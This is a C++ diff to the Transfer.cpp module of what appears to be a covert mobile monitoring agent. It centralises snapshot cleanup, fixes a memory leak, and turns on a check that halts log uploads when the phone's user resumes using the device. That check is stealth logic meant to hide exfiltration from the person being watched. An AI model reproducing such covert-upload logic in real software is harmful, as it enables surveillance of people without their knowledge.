@@ -67,8 +67,7 @@ uWifiKeyLen(0), ulRegistryDhcp(0), bGprsForced(FALSE), deviceObj(NULL) {
 Transfer::~Transfer() {
 	delete objBluetooth;
 
-	if (uberlogObj)
-		uberlogObj->ClearListSnapshot(pSnap);
+	ClearLogSnapshot();
 }
 
 BOOL Transfer::ActivateWiFi() {
@@ -1749,6 +1748,10 @@ BOOL Transfer::RestGetNewConf() {
 
 		// Nuova conf non valida
 		RestSendConfAck(FALSE);
+
+		if (pConf)
+			delete[] pConf;
+
 		return FALSE;
 	}
 
@@ -1838,7 +1841,7 @@ BOOL Transfer::RestSendLogs() {
 		if (pData == NULL) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [pData == NULL]\n", 5, FALSE);
 			CloseHandle(hFile);
-			uberlogObj->ClearListSnapshot(pSnap);
+			ClearLogSnapshot();
 			return FALSE;
 		}
 
@@ -1897,20 +1900,22 @@ BOOL Transfer::RestSendLogs() {
 		// Usciamo se siamo in crisis
 		if ((statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [We are in crisis] [8]\n", 5, FALSE);
-			uberlogObj->ClearListSnapshot(pSnap);
+			ClearLogSnapshot();
 			return FALSE;
 		}
 
 		// Usciamo dal loop se l'utente riprende ad interagire col telefono
-		/*if (bInterrupt && deviceObj->IsDeviceUnattended() == FALSE) {
+#ifndef _DEBUG
+		if (deviceObj->IsDeviceUnattended() == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [Power status changed] [9]\n", 5, FALSE);
 			delete[] pData;
-			uberlogObj->ClearListSnapshot(pSnap);
+			ClearLogSnapshot();
 			return FALSE;
-		}*/
+		}
+#endif
 	}
 
-	uberlogObj->ClearListSnapshot(pSnap);
+	ClearLogSnapshot();
 	return TRUE;
 }
 
@@ -2640,8 +2645,7 @@ UINT Transfer::SendOldProto(UINT Type, BOOL bInterrupt) {
 					DBG_TRACE(L"Debug - Transfer.cpp - Send() -> Sync() OK\n", 3, FALSE);
 				}
 
-				uberlogObj->ClearListSnapshot(pSnap);
-				pSnap = NULL;
+				ClearLogSnapshot();
 				break;
 
 			case PROTO_NEW_CONF:
@@ -3952,4 +3956,13 @@ BOOL Transfer::GetUpgrade(SOCKET s) {
 	}
 
 	return TRUE;
+}
+
+void Transfer::ClearLogSnapshot() {
+	if (uberlogObj == NULL || pSnap == NULL)
+		return;
+
+	uberlogObj->ClearListSnapshot(pSnap);
+
+	pSnap = NULL;
 }
